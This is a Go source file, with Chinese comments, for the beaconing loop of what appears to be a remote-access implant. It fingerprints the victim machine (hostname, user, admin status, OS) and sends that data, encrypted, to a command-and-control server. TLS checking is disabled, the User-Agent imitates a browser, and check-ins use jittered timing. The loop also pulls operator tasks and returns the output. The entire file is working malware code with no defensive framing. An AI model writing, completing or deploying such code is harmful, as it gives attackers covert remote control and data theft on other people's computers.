package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"os"
	"runtime"
	"time"
)

type task struct {
	Cmd  string `json:"cmd"`
	Args string `json:"args"`
}

type envelope struct {
	ID    string `json:"id"`
	Host  string `json:"host"`
	User  string `json:"user"`
	Priv  string `json:"priv"`
	OS    string `json:"os"`
	Arch  string `json:"arch"`
	TS    int64  `json:"ts"`
	Type  string `json:"type"`
	Data  string `json:"data"`
	OK    bool   `json:"ok"`
	Nonce string `json:"nonce"`
}

var (
	sessionKey []byte
	macKey     []byte
	client     *http.Client
	machine    string
)

func init() {
	client = &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
}

// deriveKeys master(64hex) -> sessionKey / macKey，绑定机器 ID
func deriveKeys(id string) error {
	master, err := hex.DecodeString(BuildKey)
	if err != nil || len(master) < 16 {
		return errors.New("bad build key")
	}
	h := sha256.New()
	h.Write(master)
	h.Write([]byte("|session|"))
	h.Write([]byte(id))
	sessionKey = h.Sum(nil)

	h2 := sha256.New()
	h2.Write(master)
	h2.Write([]byte("|mac|"))
	h2.Write([]byte(id))
	macKey = h2.Sum(nil)
	return nil
}

// pack 返回 nonce||ciphertext，密钥绑定 AAD=机器ID，防止跨机重放
func pack(id string, plain []byte) ([]byte, error) {
	block, err := aes.NewCipher(sessionKey)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	ct := gcm.Seal(nil, nonce, plain, []byte(id))
	return append(nonce, ct...), nil
}

func unpack(id string, raw []byte) ([]byte, error) {
	block, err := aes.NewCipher(sessionKey)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	if len(raw) < gcm.NonceSize()+1 {
		return nil, errors.New("short packet")
	}
	nonce := raw[:gcm.NonceSize()]
	ct := raw[gcm.NonceSize():]
	return gcm.Open(nil, nonce, ct, []byte(id))
}

func sign(b []byte) string {
	m := hmac.New(sha256.New, macKey)
	m.Write(b)
	return hex.EncodeToString(m.Sum(nil))
}

func c2URL() string {
	scheme := "https://"
	if BuildPath != "" && BuildPath[0] == '/' {
		return scheme + BuildC2 + BuildPath
	}
	return scheme + BuildC2 + "/" + BuildPath
}

func send(env envelope) ([]byte, error) {
	env.ID = machine
	env.TS = time.Now().Unix()
	if env.Host == "" {
		env.Host, _ = os.Hostname()
	}
	if env.User == "" {
		env.User = os.Getenv("USERNAME")
	}
	if env.Priv == "" {
		if isAdmin() {
			env.Priv = "admin"
		} else {
			env.Priv = "user"
		}
	}
	env.OS = runtime.GOOS + "-" + runtime.GOARCH

	plain, err := json.Marshal(env)
	if err != nil {
		return nil, err
	}
	raw, err := pack(machine, plain)
	if err != nil {
		return nil, err
	}

	req, err := http.NewRequest("POST", c2URL(), bytes.NewReader(raw))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("X-Gati-Id", machine)
	req.Header.Set("X-Gati-Sig", sign(raw))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36")

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(io.LimitReader(resp.Body, 8<<20))
	if err != nil {
		return nil, err
	}
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("status %d", resp.StatusCode)
	}
	return body, nil
}

// c2Loop 心跳主循环：抖动 45~75 秒，失联指数退避
func c2Loop() error {
	var err error
	machine, err = machineID()
	if err != nil {
		return err
	}
	if err := deriveKeys(machine); err != nil {
		return err
	}
	logf("machine id %s -> %s", machine, c2URL())

	backoff := 1
	for {
		body, err := send(envelope{Type: "beacon"})
		if err != nil {
			logf("beacon fail: %v (backoff %ds)", err, backoff)
			time.Sleep(time.Duration(backoff) * time.Second)
			if backoff < 300 {
				backoff *= 2
			}
			continue
		}
		backoff = 1

		if len(body) == 0 {
			sleepJitter()
			continue
		}

		plain, err := unpack(machine, body)
		if err != nil {
			logf("unpack fail: %v", err)
			sleepJitter()
			continue
		}

		var t task
		if err := json.Unmarshal(plain, &t); err != nil {
			logf("task parse fail: %v", err)
			sleepJitter()
			continue
		}
		if t.Cmd == "" || t.Cmd == "none" {
			sleepJitter()
			continue
		}

		logf("task: %s %s", t.Cmd, t.Args)
		out, ok := dispatch(t)
		// 结果立即回传
		if _, err := send(envelope{Type: "result", Data: base64.StdEncoding.EncodeToString(out), OK: ok}); err != nil {
			logf("result send fail: %v", err)
		}
		sleepJitter()
	}
}

func sleepJitter() {
	d := 45 + (time.Now().UnixNano()%30)
	time.Sleep(time.Duration(d) * time.Second)
}
